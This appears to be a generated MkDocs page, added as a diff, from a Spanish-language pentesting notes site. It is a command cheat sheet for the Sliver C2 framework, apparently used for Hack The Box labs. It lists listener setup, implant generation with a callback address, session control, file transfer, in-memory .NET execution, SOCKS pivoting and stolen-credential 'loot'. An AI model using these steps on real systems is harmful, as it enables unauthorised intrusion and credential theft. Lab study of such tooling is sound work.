@@ -1,0 +1,1445 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../nxc/">
+      
+      
+        <link rel="next" href="../seimpersonate/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/lucifer.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Sliver C2 - Bitácora de javik</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../estilos/gruvbox.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sliver-c2-comandos-y-flujo-de-trabajo" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../.." title="Bitácora de javik" class="md-header__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../assets/lucifer.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Bitácora de javik
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Sliver C2
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Bitácora de javik" class="md-nav__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../assets/lucifer.png" alt="logo">
+
+    </a>
+    Bitácora de javik
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 Bitácora de javik
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../maquinas/htb/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💀 Máquinas HTB
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💀 Máquinas HTB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/administrator/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Administrator
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/babytwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BabyTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/delegate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Delegate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/tombwatcher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TombWatcher
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/escapetwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    EscapeTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/breach/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Breach
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/media/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Media
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../maquinas/htb/authority/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authority
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛠️ Herramientas
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🛠️ Herramientas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nxc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NetExec (NXC)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sliver C2
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sliver C2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-gestion-del-servidor-listeners-infraestructura" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Gestión del Servidor (Listeners / Infraestructura)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-generacion-de-implantes-build" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Generación de Implantes (Build)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-control-de-sesiones-y-beacons" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Control de Sesiones y Beacons
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-post-explotacion-dentro-de-la-sesion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Post-Explotación (Dentro de la Sesión)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-tecnicas-avanzadas-y-pivoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Técnicas Avanzadas y Pivoting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-flujo-de-trabajo-tipico" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Flujo de Trabajo Típico
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../seimpersonate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SeImpersonatePrivilege
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mssql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumeración MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../chisel-pivoting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chisel & Pivoting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../certificaciones/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏆 Certificaciones
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../mis-notas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mis Notas
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mis Notas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mis-notas/configuracion-ad-basico/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuración de AD Básico
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../mis-notas/ataques-adcs-esc1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Abuso de AD CS (ESC1)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-gestion-del-servidor-listeners-infraestructura" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Gestión del Servidor (Listeners / Infraestructura)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-generacion-de-implantes-build" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Generación de Implantes (Build)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-control-de-sesiones-y-beacons" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Control de Sesiones y Beacons
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-post-explotacion-dentro-de-la-sesion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Post-Explotación (Dentro de la Sesión)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-tecnicas-avanzadas-y-pivoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Técnicas Avanzadas y Pivoting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-flujo-de-trabajo-tipico" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Flujo de Trabajo Típico
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="sliver-c2-comandos-y-flujo-de-trabajo">Sliver C2 — Comandos y Flujo de Trabajo<a class="headerlink" href="#sliver-c2-comandos-y-flujo-de-trabajo" title="Permanent link">&para;</a></h1>
+<p>Referencia rápida para el marco de mando y control (C2) <strong>Sliver</strong>, cubriendo gestión de listeners, generación de implantes, control de sesiones, post-explotación y pivoting.</p>
+<hr />
+<h2 id="1-gestion-del-servidor-listeners-infraestructura">1. Gestión del Servidor (Listeners / Infraestructura)<a class="headerlink" href="#1-gestion-del-servidor-listeners-infraestructura" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Comando</th>
+<th style="text-align: left;">Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>jobs</code></td>
+<td style="text-align: left;">Lista de listeners y tareas en ejecución.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>http</code></td>
+<td style="text-align: left;">Inicia listener HTTP (por defecto puerto 80 / 8080).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>https</code></td>
+<td style="text-align: left;">Inicia listener HTTPS seguro (puerto 443).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>mtls</code></td>
+<td style="text-align: left;">Inicia listener mTLS (comunicación cifrada mutua).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>dns</code></td>
+<td style="text-align: left;">Inicia listener DNS (para redes con estricto filtrado web).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>wg</code></td>
+<td style="text-align: left;">Inicia listener WireGuard (túnel VPN dedicado).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>jobs -k &lt;ID&gt;</code></td>
+<td style="text-align: left;">Detiene un trabajo o listener específico por su identificador.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="2-generacion-de-implantes-build">2. Generación de Implantes (Build)<a class="headerlink" href="#2-generacion-de-implantes-build" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Comando</th>
+<th style="text-align: left;">Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>generate</code></td>
+<td style="text-align: left;">Crea un binario base interactivo.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>generate --http &lt;IP&gt; --os &lt;OS&gt;</code></td>
+<td style="text-align: left;">Genera un implante básico especificando protocolo y sistema operativo (windows/linux/darwin).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>profiles</code></td>
+<td style="text-align: left;">Lista los perfiles de compilación guardados.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>profiles new --http &lt;IP&gt; --name &lt;NOMBRE&gt;</code></td>
+<td style="text-align: left;">Guarda un perfil reutilizable con configuración fija.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>implants</code></td>
+<td style="text-align: left;">Lista todos los ejecutables e implantes generados previamente.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="3-control-de-sesiones-y-beacons">3. Control de Sesiones y Beacons<a class="headerlink" href="#3-control-de-sesiones-y-beacons" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Comando</th>
+<th style="text-align: left;">Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>sessions</code></td>
+<td style="text-align: left;">Lista todas las sesiones activas conectadas.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>use &lt;ID&gt;</code></td>
+<td style="text-align: left;">Entra e interactúa con una sesión específica (prompt interactivo).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>background</code></td>
+<td style="text-align: left;">Pone la sesión actual en segundo plano y regresa a la consola principal de Sliver.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>info</code></td>
+<td style="text-align: left;">Muestra información técnica detallada del host objetivo (hostname, SO, arquitectura).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>beacons</code></td>
+<td style="text-align: left;">Gestión de implantes en modo beacon asíncrono (sigiloso, sleep / jitter).</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="4-post-explotacion-dentro-de-la-sesion">4. Post-Explotación (Dentro de la Sesión)<a class="headerlink" href="#4-post-explotacion-dentro-de-la-sesion" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Comando</th>
+<th style="text-align: left;">Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>ls</code> / <code>pwd</code> / <code>cd</code></td>
+<td style="text-align: left;">Navegación básica en el sistema de archivos del objetivo.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>upload &lt;archivo&gt;</code></td>
+<td style="text-align: left;">Sube un archivo local hacia la máquina comprometida.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>download &lt;archivo&gt;</code></td>
+<td style="text-align: left;">Descarga un archivo desde el objetivo a tu máquina atacante.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>getuid</code></td>
+<td style="text-align: left;">Muestra el usuario y nivel de privilegios actual.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>ps</code></td>
+<td style="text-align: left;">Lista los procesos activos en ejecución.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>kill &lt;PID&gt;</code></td>
+<td style="text-align: left;">Finaliza un proceso en la máquina objetivo.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>execute -f &lt;bin&gt; -a "&lt;args&gt;"</code></td>
+<td style="text-align: left;">Ejecuta un binario o comando sin abrir una shell interactiva ruidosa.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>shell</code></td>
+<td style="text-align: left;">Spawnea una shell interactiva del sistema (mayor nivel de ruido).</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="5-tecnicas-avanzadas-y-pivoting">5. Técnicas Avanzadas y Pivoting<a class="headerlink" href="#5-tecnicas-avanzadas-y-pivoting" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Comando</th>
+<th style="text-align: left;">Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>armory</code></td>
+<td style="text-align: left;">Instala extensiones y herramientas de terceros (Seatbelt, SharpHound, Rubeus, etc.).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>execute-assembly</code></td>
+<td style="text-align: left;">Carga y ejecuta un ensamblado .NET directamente en la memoria RAM (sin tocar disco).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>socks5</code></td>
+<td style="text-align: left;">Levanta un servidor proxy SOCKS5 en el implante para saltar a redes internas (Pivoting).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>loot</code></td>
+<td style="text-align: left;">Visualiza y gestiona credenciales, hashes y tokens robados.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>clean</code></td>
+<td style="text-align: left;">Limpia registros y artefactos de la base de datos local.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="6-flujo-de-trabajo-tipico">6. Flujo de Trabajo Típico<a class="headerlink" href="#6-flujo-de-trabajo-tipico" title="Permanent link">&para;</a></h2>
+<ol>
+<li><strong>Configurar Listener:</strong>
+   <div class="highlight"><pre><span></span><code>http --lport 8080
+jobs
+</code></pre></div></li>
+<li><strong>Generar Implante:</strong>
+   <div class="highlight"><pre><span></span><code>generate --http 10.10.14.X:8080 --os windows --arch amd64 --save payload.exe
+</code></pre></div></li>
+<li><strong>Monitorear y Tomar Control:</strong>
+   <div class="highlight"><pre><span></span><code>sessions
+use &lt;SESSION_ID&gt;
+</code></pre></div></li>
+<li><strong>Operar y Enumerar:</strong>
+   <div class="highlight"><pre><span></span><code>getuid
+ps
+download C:\Users\Administrator\Desktop\flag.txt
+</code></pre></div></li>
+<li><strong>Limpieza y Cierre:</strong>
+   <div class="highlight"><pre><span></span><code>sessions -k &lt;SESSION_ID&gt;
+jobs -k &lt;JOB_ID&gt;
+</code></pre></div></li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pie" >
+        
+          
+          <a href="../nxc/" class="md-footer__link md-footer__link--prev" aria-label="Anterior: NetExec (NXC)">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Anterior
+              </span>
+              <div class="md-ellipsis">
+                NetExec (NXC)
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../seimpersonate/" class="md-footer__link md-footer__link--next" aria-label="Siguiente: SeImpersonatePrivilege">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Siguiente
+              </span>
+              <div class="md-ellipsis">
+                SeImpersonatePrivilege
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.indexes", "navigation.top", "navigation.instant", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
